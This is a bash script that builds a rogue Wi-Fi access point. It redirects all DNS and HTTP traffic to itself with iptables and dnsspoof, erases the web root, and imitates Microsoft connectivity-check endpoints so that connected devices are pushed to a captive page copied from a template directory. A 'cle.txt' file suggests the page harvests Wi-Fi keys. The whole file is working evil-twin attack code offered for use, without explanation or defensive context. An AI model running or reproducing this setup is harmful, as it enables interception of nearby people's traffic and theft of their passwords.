#!/bin/bash

carte="$(cat hostapdcarte)"
ssid="$(cat ssid.txt)"
echo "${carte}"
while [ -z "${carte}" ]; do read -r ${carte}; done


echo "$ssid"
while [ -z "${ssid}" ]; do read -r ${ssid}; done


echo "Configuring the fake AP..."
ifconfig ${carte} up
sudo sysctl net.ipv4.ip_forward=1
ifconfig ${carte} 175.0.0.1 netmask 255.255.255.0
ifconfig ${carte} mtu 1400
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
sleep 2;
route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 175.0.0.1
iptables -P FORWARD ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 175.0.0.1:80
sleep 1;
dnsspoof -i ${carte} &
sleep 2;
page="$(cat page.txt)"
echo "${page}"
while [ -z "${page}" ]; do read -r ${page}; done
echo "Configuring apache..."
cd /var/www/
rm -rf *
cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF
sleep 1;
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
mkdir generate_204
sleep 1;
cd /var/www/generate_204/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /var/www/
mkdir msftconnecttest
sleep 1;
mkdir msftnci
sleep 1;
cd /var/www/msftnci/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
cd /var/www/
mkdir redirect
sleep 1;
cd /var/www/msftconnecttest/
cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF
sleep 1;
cd /var/www/redirect/
cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF
sleep 1;
cd /var/www/
cp -R /etc/${page}/* /var/www/
sleep 3;
mv ${page}.php index.php
chown -R root:www-data /var/www/*
sleep 1;
chmod 764 /var/www/msftconnecttest/qrcode
chmod 764 /var/www/qrcode
cd /var/www/shout/
chown -R root:www-data /var/www/shout/chat.txt
chmod 764 /var/www/shout/chat.txt
chmod  777 *
cd /var/www/msftconnecttest/
cp -R /etc/${page}/msftconnecttest/* /var/www/msftconnecttest/
sleep 3;
cd /var/www/msftconnecttest/
mv ${page}.php index.php
chown -R root:www-data /var/www/*
sleep 1;
cd /var/www/msftconnecttest/shout/
chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt
chmod 764 /var/www/msftconnecttest/shout/chat.txt
chmod  777 *
cd /var/www/msftconnecttest/
if [ -f "cle.txt" ];then
chmod 777 *
chown -R root:www-data /var/www/msftconnecttest/cle.txt
chmod 764 /var/www/msftconnecttest/cle.txt
service apache2 restart
sleep 4;
cd /var/www/
chmod 777 *
chown -R root:www-data /var/www/cle.txt
chmod 764 /var/www/cle.txt
service apache2 restart
sleep 4;
echo "\e[1;32m[*] Fake AP created...\e[0m"
else
chmod 777 *
service apache2 restart
sleep 4;
echo "\e[1;32m[*] Fake AP created...\e[0m"
fi